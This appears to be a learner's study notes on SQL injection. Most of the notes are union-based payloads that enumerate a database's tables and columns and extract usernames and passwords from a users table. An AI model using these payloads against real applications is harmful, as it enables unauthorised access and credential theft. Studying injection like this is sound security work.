
## 1. SQL Injection

### What is it?
User input inserted directly into SQL query 
without sanitization. Attacker modifies the 
query logic.

### How to identify
Test every input field with:
```sql
' OR \ " \ OR ";--" OR 1=1
```
Single quote. If page errors or behaves 
differently = potentially vulnerable.


### Types Practiced

**Union-Based (In-Band)**
Results visible directly on page.

```sql
-- Find column count
1 UNION SELECT 1--
1 UNION SELECT 1,2--  ← no error = 2 columns
1 UNION SELECT 1,2,3--   ← no error = 3 columns

-- Make output visible
0 UNION SELECT 1,2

-- Get database name
0 UNION SELECT 1,database()

-- List tables
0 UNION SELECT 1,group_concat(table_name) 
FROM information_schema.tables 
WHERE table_schema = database()

-- List columns
0 UNION SELECT 1,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name = 'users'

OR

-- List columns
0 UNION SELECT 1,group_concat(column_name) 
FROM information_schema.columns 
WHERE table_name = 0x7573657273

0x7573657273 = users > Hex Value

But better version:

0 UNION SELECT 1,column_name
FROM information_schema.columns
WHERE table_schema=database()
AND table_name=0x7573657273

-- Extract credentials
0 UNION SELECT 1,group_concat(username,':',password 
SEPARATOR '<br>') FROM users

OR

0 UNION SELECT user,password FROM users
```

